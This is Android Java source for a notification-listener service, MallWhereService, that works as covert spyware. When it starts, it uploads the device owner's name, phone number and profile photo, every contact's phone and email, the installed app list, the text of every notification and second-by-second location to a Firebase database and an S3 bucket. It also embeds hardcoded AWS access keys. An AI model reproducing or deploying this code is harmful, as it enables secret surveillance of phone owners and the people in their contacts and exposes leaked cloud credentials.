package io.perihelion.takecharge;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.mobileconnectors.s3.transfermanager.TransferManager;
import com.amazonaws.mobileconnectors.s3.transfermanager.Upload;
import com.amazonaws.mobileconnectors.s3.transfermanager.model.UploadResult;
import com.firebase.client.Firebase;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;


public class MallWhereService extends NotificationListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {

    private final String TAG = getClass().getName();
    private Firebase userDataRef;
    private GoogleApiClient mGoogleApiClient;
    private LocationRequest mLocationRequest;

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (null != mGoogleApiClient) {
            mGoogleApiClient.disconnect();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        Firebase.setAndroidContext(this);
        userDataRef = new Firebase("https://takecharge.firebaseio.com/" + getAndroidId());
        setUserInfo();
        uploadUserContacts();
        getInstalledApps();
        mLocationRequest = LocationRequest.create();
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        mLocationRequest.setInterval(1000);
        mLocationRequest.setFastestInterval(1000);
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addApi(LocationServices.API)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .build();
        mGoogleApiClient.connect();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d(TAG, "onNotificationPosted");
        userDataRef.child("notifications").push().setValue(new LoggedNotification(sbn.getPackageName(), (String) sbn.getNotification().tickerText, sbn.getId()));
        Log.d(TAG, "ID :" + sbn.getId() + "t" + sbn.getNotification().tickerText + "t" + sbn.getPackageName());
    }

    private void getInstalledApps() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            Firebase ref = userDataRef.child("apps").push();
            ref.child("packageName").setValue(packageInfo.packageName);
            ref.child("appName").setValue(packageInfo.loadLabel(getPackageManager()).toString());
        }
    }

    private void setUserInfo() {
        UserInfo userInfo = new UserInfo();
        userInfo.setManufacturer(Build.MANUFACTURER);
        userInfo.setProduct(Build.PRODUCT);
        userInfo.setModel(Build.MODEL);
        userInfo.setAndroidVersion(Build.VERSION.RELEASE);
        TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
        userInfo.setPhone(tMgr.getLine1Number());
        Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
        c.moveToFirst();
        userInfo.setName(c.getString(c.getColumnIndex("DISPLAY_NAME")));
        InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(getContentResolver(), ContactsContract.Profile.CONTENT_URI);

        try {
            final File file = new File(getCacheDir(), "profPic.png");
            try {
                try (OutputStream output = new FileOutputStream(file)) {
                    final byte[] buffer = new byte[1024];
                    int read;

                    while ((read = input.read(buffer)) != -1)
                        output.write(buffer, 0, read);

                    output.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            AWSCredentials credential = new BasicAWSCredentials("AKIAIHAPH4VNZWPFWB2Q", "X9SorZOisWZNWOU0Nm+gC3m1+HQoZzZ6admZrIv3");
            TransferManager manager = new TransferManager(credential);
            Upload upload = manager.upload("takecharge", getAndroidId() + ".png", file);
            userInfo.setPic("https://s3.amazonaws.com/takecharge/" + getAndroidId() + ".png");
        } finally {
            try {
                userDataRef.child("userinfo").setValue(userInfo);
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        c.close();
    }

    private void uploadUserContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Contact newContact = new Contact();
                    newContact.setId(cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID)));
                    newContact.setName(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{newContact.getId()}, null);
                    while (pCur.moveToNext()) {
                        newContact.setPhone(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    }
                    pCur.close();
                    Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{newContact.getId()}, null);
                    while (emailCur.moveToNext()) {
                        newContact.setEmail(emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));
                    }
                    emailCur.close();
                    userDataRef.child("contacts").child(newContact.getId()).setValue(newContact);
                }
            }
        }
        cur.close();
    }

    private String getAndroidId() {
        String[] params = {"android_id"};
        Cursor c = getContentResolver()
                .query(Uri.parse("content://com.google.android.gsf.gservices"), null, null, params, null);

        if (!c.moveToFirst() || c.getColumnCount() < 2) {
            c.close();
            return null;
        }

        try {
            String androidId = Long.toHexString(Long.parseLong(c.getString(1)));
            c.close();
            return androidId;
        } catch (NumberFormatException e) {
            c.close();
            return null;
        }
    }

    @Override
    public void onConnected(Bundle bundle) {
        LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
    }

    @Override
    public void onConnectionSuspended(int i) {

    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {

    }

    @Override
    public void onLocationChanged(Location location) {
        userDataRef.child("location").child("lat").setValue(location.getLatitude());
        userDataRef.child("location").child("lng").setValue(location.getLongitude());
    }
}
